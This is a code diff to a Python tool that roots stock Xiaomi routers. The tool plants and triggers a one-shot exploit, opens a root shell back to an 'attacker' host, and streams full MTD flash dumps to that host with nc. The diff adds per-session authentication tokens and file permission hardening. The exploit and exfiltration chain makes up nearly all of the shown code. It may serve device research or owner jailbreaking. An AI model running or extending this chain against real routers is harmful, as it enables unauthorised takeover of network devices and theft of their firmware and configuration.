@@ -43,6 +43,7 @@ import hashlib
 import json
 import os
 import re
+import secrets
 import shutil
 import subprocess
 import sys
@@ -209,7 +210,8 @@ def collect(ch, facts_path):
     return facts
 
 
-def pull(ch, sink, outdir, mtdmap, label, candidates, attacker, file_port):
+def pull(ch, sink, outdir, mtdmap, label, candidates, attacker, file_port,
+         token):
     """Read a whole MTD partition back over the bulk channel.
 
     Three readers in preference order, because which of them exists is one of
@@ -230,7 +232,8 @@ def pull(ch, sink, outdir, mtdmap, label, candidates, attacker, file_port):
     ]
     for name, reader in readers:
         log(f"[*] dumping {part} (mtd{idx}, {size} B) as {label}.bin via {name}")
-        cmd = (f'({{ echo "FILE {label}.bin {size}"; {reader}; }} '
+        cmd = (f'({{ echo "AUTH {token}"; echo "FILE {label}.bin {size}"; '
+               f'{reader}; }} '
                f'| nc {attacker} {file_port}) >/dev/null 2>&1 &')
         ch.run(cmd, timeout=30, retries=0, quiet=True)
         got, path = _await_file(sink, f"{label}.bin", size)
@@ -256,7 +259,20 @@ def _await_file(sink, want_name, size):
     return 0, None
 
 
+def write_session_manifest(outdir, bind, peer, serve_port, shell_port,
+                           file_port, token):
+    path = os.path.join(outdir, "session.json")
+    with open(path, "w") as output:
+        json.dump({"bind": bind, "peer": peer, "serve_port": serve_port,
+                   "shell_port": shell_port, "file_port": file_port,
+                   "session_token": token}, output, indent=2)
+        output.write("\n")
+    os.chmod(path, 0o600)
+    return path
+
+
 def main():
+    os.umask(0o077)
     ap = argparse.ArgumentParser(
         description="Read-only fact-finding run on a supported stock Xiaomi router.")
     devices.add_device_argument(ap)
@@ -282,6 +298,8 @@ def main():
                     help="exit when done instead of keeping the root shell open")
     ap.add_argument("--force", action="store_true",
                     help="continue past a hardware/ROM mismatch")
+    ap.add_argument("--session-token", default=None,
+                    help="token from the original run when using --skip-exploit")
     args = ap.parse_args()
     profile = devices.get_profile(args.device)
     args.host = args.host or profile.stock_host
@@ -291,12 +309,13 @@ def main():
         # open" fallback -- the shape is what matters here, not the values.
         print(channel.build_stager(
             args.attacker or "<operator-ip>", args.serve_port,
-            args.shell_port, []).decode())
+            args.shell_port, [], args.session_token or "TOKEN").decode())
         return 0
 
     stamp = time.strftime("%Y%m%d-%H%M%S")
     outdir = args.outdir or f"probe-{stamp}"
-    os.makedirs(outdir, exist_ok=True)
+    os.makedirs(outdir, mode=0o700, exist_ok=True)
+    os.chmod(outdir, 0o700)
     transcript = open(f"{outdir}/transcript.log", "w")
     chain.set_log_sink(transcript)
     log(f"[*] output -> {outdir}/")
@@ -306,6 +325,14 @@ def main():
         log("[-] could not work out which address the device would reach us on; "
             "pass --attacker")
         return 1
+    token = args.session_token or secrets.token_hex(16)
+    if args.skip_exploit and not args.session_token:
+        log("[-] --skip-exploit requires the original --session-token")
+        return 1
+    session_path = write_session_manifest(
+        outdir, attacker, args.host, args.serve_port, args.shell_port,
+        args.file_port, token)
+    log(f"[*] attachment session -> {session_path} (mode 0600)")
 
     result = {"host": args.host, "attacker": attacker, "when": stamp}
 
@@ -348,19 +375,21 @@ def main():
             log(f"[3] {b['ifname']}: ssid={b['ssid']!r} enc={b['encryption']!r} "
                 f"chan={b['channel']}")
 
-    stager = channel.build_stager(attacker, args.serve_port, args.shell_port, restore)
+    stager = channel.build_stager(
+        attacker, args.serve_port, args.shell_port, restore, token)
     if args.print_stager:
         print(stager.decode())
         return 0
 
-    http = channel.StagerServer(args.serve_port, stager)
-    ch = channel.ShellChannel(args.shell_port)
-    sink = channel.FileSink(args.file_port, outdir)
+    http = channel.StagerServer(
+        attacker, args.serve_port, stager, token, args.host)
+    ch = channel.ShellChannel(attacker, args.shell_port, token, args.host)
 
     # ---- phases 3-4: plant, then fire the one-shot -------------------------
     if not args.skip_exploit:
         log("\n=== phase 3: plant ===")
-        chain.plant(args.host, stok, attacker, args.serve_port, restore)
+        chain.plant(args.host, stok, attacker, args.serve_port, restore,
+                    http.stager_path)
 
         log("\n--- after the trigger the AP bounces; it comes back as: ---")
         for band, ssid, sec in channel.expected_wifi(restore):
@@ -416,10 +445,17 @@ def main():
     dumps = {}
     if not args.no_dumps and mtdmap:
         log("\n=== phase 7: dumps ===")
+        expected_files = {}
+        for label, candidates in DUMPS:
+            part = next((candidate for candidate in candidates if candidate in mtdmap), None)
+            if part:
+                expected_files[f"{label}.bin"] = mtdmap[part][1]
+        sink = channel.FileSink(
+            attacker, args.file_port, outdir, token, args.host, expected_files)
         for label, candidates in DUMPS:
             try:
                 got = pull(ch, sink, outdir, mtdmap, label, candidates,
-                           attacker, args.file_port)
+                           attacker, args.file_port, token)
             except Exception as e:                               # noqa: BLE001
                 log(f"[!] {label}: {type(e).__name__}: {e}")
                 got = None
